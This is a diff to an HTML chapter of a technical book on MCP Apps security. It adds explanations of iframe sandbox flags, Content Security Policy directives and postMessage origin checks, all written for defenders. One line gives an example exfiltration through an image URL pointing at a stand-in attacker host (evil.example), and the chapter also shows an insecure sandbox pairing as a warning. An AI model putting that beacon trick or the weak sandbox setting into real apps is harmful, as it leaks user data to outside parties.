@@ -251,7 +251,60 @@ def dashboard(ctx: RequestContext, uri: str):
 <section id="what-the-sandbox-guarantees" class="level3">
 <h3>What the sandbox guarantees</h3>
 <p>The iframe cannot reach the parent DOM, cannot read the host’s cookies or local storage, cannot navigate the parent page, and cannot execute in the parent context. Standard browser sandboxing, doing what it was designed for.</p>
-<p>Network access is denied by default and granted only to origins the server declared in <code>_meta.ui.csp</code>. An app that wants to load a charting library from a CDN must say so in advance, in a field a human can read during review.</p>
+<p>Two mechanisms produce that, and they are worth separating because they fail independently.</p>
+<p><strong>The <code>sandbox</code> attribute</strong> on the iframe. By default it removes almost everything: scripts, forms, popups, top-level navigation, and, crucially, the frame’s origin. A sandboxed frame gets a unique opaque origin, which is what makes it a stranger to the parent page rather than a colleague.</p>
+<p>An app needs JavaScript, so the host adds <code>allow-scripts</code> back. What it must never add alongside it is <code>allow-same-origin</code>:</p>
+<pre class="text" data-language="text"><code>sandbox=&quot;allow-scripts&quot;                      the app runs, isolated
+sandbox=&quot;allow-scripts allow-same-origin&quot;    the sandbox is now decorative</code></pre>
+<p>Those two together give the frame back the parent’s origin <em>and</em> the ability to run code in it, which is precisely the combination the sandbox existed to prevent. The frame can then reach into the parent document, read storage, and remove its own sandbox attribute for good measure. The browser warns about this pairing in the console and permits it anyway, and it is the single most common way a sandbox turns out to have been decoration.</p>
+<p><strong>A Content Security Policy</strong>, which controls what the frame may talk to.</p>
+</section>
+<section id="csp-for-people-who-have-not-written-one" class="level3">
+<h3>CSP, for people who have not written one</h3>
+<p>A Content Security Policy is a list of directives, each naming a class of resource and the origins that class may come from. The browser enforces it, which is what makes it worth anything: an app cannot opt out of a policy applied to it.</p>
+<p>The directives that matter here:</p>
+<table id="tab:csp-directives">
+<caption>A deny-by-default policy sets <code>default-src ’none’</code> and then adds back only what the app demonstrably needs.</caption>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Directive</strong></td>
+<td style="text-align: left;"><strong>Governs</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>connect-src</code></td>
+<td style="text-align: left;"><code>fetch</code>, XHR, WebSocket, <code>sendBeacon</code>. The exfiltration directive</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>script-src</code></td>
+<td style="text-align: left;">Where executable code may be loaded from</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>style-src</code></td>
+<td style="text-align: left;">Stylesheets</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>img-src</code></td>
+<td style="text-align: left;">Images, which are a data channel too: a URL is a GET</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>frame-src</code></td>
+<td style="text-align: left;">Nested frames</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>default-src</code></td>
+<td style="text-align: left;">The fallback for anything not named above</td>
+</tr>
+</tbody>
+</table>
+<p>The host builds the policy, starting from deny-everything and adding the origins the server declared in <code>_meta.ui.csp</code>. So an app that wants a charting library from a CDN must say so in advance, in a field a human reads during review, rather than discovering the need at runtime and reaching for it.</p>
+<pre class="json" data-language="json"><code>&quot;_meta&quot;: {
+  &quot;ui&quot;: {
+    &quot;resourceUri&quot;: &quot;ui://meridian/risk-dashboard&quot;,
+    &quot;csp&quot;: { &quot;connect-src&quot;: [&quot;https://api.meridian.example&quot;] }
+  }
+}</code></pre>
+<p>Note which directive the exfiltration lives behind. An app that renders account data and declares <code>connect-src</code> to an origin you do not recognise has asked you, in writing, for permission to send that data somewhere. And <code>img-src</code> is the one people forget: setting an image source to <code>https://evil.example/?d=&lt;data&gt;</code> is a GET request with a payload, and no <code>connect-src</code> entry is involved.</p>
+<p>Meridian’s template needs none of this. It has no external assets, so its policy is deny-everything, and its only channel to the world is the one described below.</p>
 </section>
 <section id="the-rule-that-everything-else-rests-on" class="level3">
 <h3>The rule that everything else rests on</h3>
@@ -364,11 +417,24 @@ const rpc = (method, params) =&gt; new Promise(resolve =&gt; {
 parent.postMessage({ jsonrpc: &#39;2.0&#39;, id: &#39;init&#39;, method: &#39;ui/initialize&#39;,
                      params: { protocolVersion: &#39;2026-01-26&#39; } }, &#39;*&#39;);</code></pre>
 <p>Note that the app announces <em>its</em> protocol version, <code>2026-01-26</code>, which is the Apps extension’s own revision, not core MCP’s. Extensions version independently, as Chapter <a href="ch09.html#ch:tasks">9</a> described, and this is what that looks like in practice.</p>
+<section id="what-postmessage-is-and-where-the-check-goes" class="level3">
+<h3>What <code>postMessage</code> is, and where the check goes</h3>
+<p><code>postMessage</code> exists because the same-origin policy forbids two documents from different origins touching each other’s DOM, and yet they sometimes need to talk. It is the one sanctioned hole: a document may send a structured-cloneable value to another window, which receives it as an event.</p>
+<p>It has two parameters that carry all the security, one on each side.</p>
+<p><strong>Sending: <code>targetOrigin</code>.</strong> The second argument to <code>postMessage</code>. The browser delivers the message only if the receiving document’s origin matches, so passing your host’s actual origin means a frame that has been navigated somewhere unexpected receives nothing. Passing <code>’*’</code> means deliver to whoever is there.</p>
+<p><strong>Receiving: <code>event.origin</code>.</strong> The property on the inbound event, set by the browser and not by the sender, which is what makes it trustworthy. Nothing checks it for you.</p>
+<pre class="text" data-language="text"><code>window.addEventListener(&#39;message&#39;, (e) =&gt; {
+  if (e.origin !== EXPECTED_ORIGIN) return;   // the whole check
+  handle(e.data);
+});</code></pre>
+<p>Omit those two lines in a host and any page that can get a handle on your window can send you JSON-RPC. The bridge is the app’s only channel to the outside, so whatever can write to the bridge has the app’s whole authority, and the app’s authority includes calling tools.</p>
+<p>The asymmetry is worth stating plainly, because it decides where to spend your care. An app that gets <code>targetOrigin</code> wrong leaks its own messages. A host that skips <code>event.origin</code> accepts commands from anybody. The receiving side is where the security is.</p>
 <aside class="box note"><p class="box-title">On <code>targetOrigin: ’*’</code></p>
 <p>Meridian passes <code>’*’</code> because the host’s origin is not known to a template that may be rendered by any host.</p>
 <p>In production, do better where you can. The host should pass its origin during <code>ui/initialize</code> and the app should use it thereafter. And the host must validate the origin of every inbound message regardless, because that side of the check is the one that actually protects anybody.</p>
 </aside>
 <p>Frameworks are entirely optional. The official examples ship starters for React, Vue, Svelte, Preact, Solid, and vanilla JavaScript, and the <code>App</code> class in <code>@modelcontextprotocol/ext-apps</code> is a convenience wrapper. It is postMessage and JSON-RPC underneath, which means the whole web platform is available and none of it is mandatory.</p>
+</section>
 </section>
 <section id="ux-patterns-worth-copying" class="level2">
 <h2>UX patterns worth copying</h2>
@@ -421,8 +487,9 @@ parent.postMessage({ jsonrpc: &#39;2.0&#39;, id: &#39;init&#39;, method: &#39;ui
 <li><p>Apps is an extension, <code>io.modelcontextprotocol/ui</code>, negotiated like any other.</p></li>
 <li><p>Tools declare a template via <code>_meta.ui.resourceUri</code>; templates live at <code>ui://</code> resources.</p></li>
 <li><p>Predeclaration lets the host prefetch, cache, and <em>review</em> before any tool runs. Review is the real benefit.</p></li>
-<li><p>Sandboxed iframe. No parent DOM, no cookies, no network unless the server declared origins.</p></li>
+<li><p>Sandboxed iframe. <code>allow-scripts</code> without <code>allow-same-origin</code>, or the sandbox is decoration. Deny-by-default CSP, and <code>connect-src</code> is the exfiltration directive.</p></li>
 <li><p>Every UI-initiated tool call goes through the host’s normal consent and audit path. This rule is what makes the rest safe.</p></li>
+<li><p>Validate <code>event.origin</code> on every inbound <code>postMessage</code>. The receiving side is where the security is.</p></li>
 <li><p><code>structuredContent</code> feeds the app, <code>content</code> feeds the model, and that split is how an app saves context.</p></li>
 <li><p>Build an app when the next three questions are clicks. Otherwise return text.</p></li>
 <li><p>Always degrade gracefully. Not every host renders apps, and your text result must stand alone.</p></li>
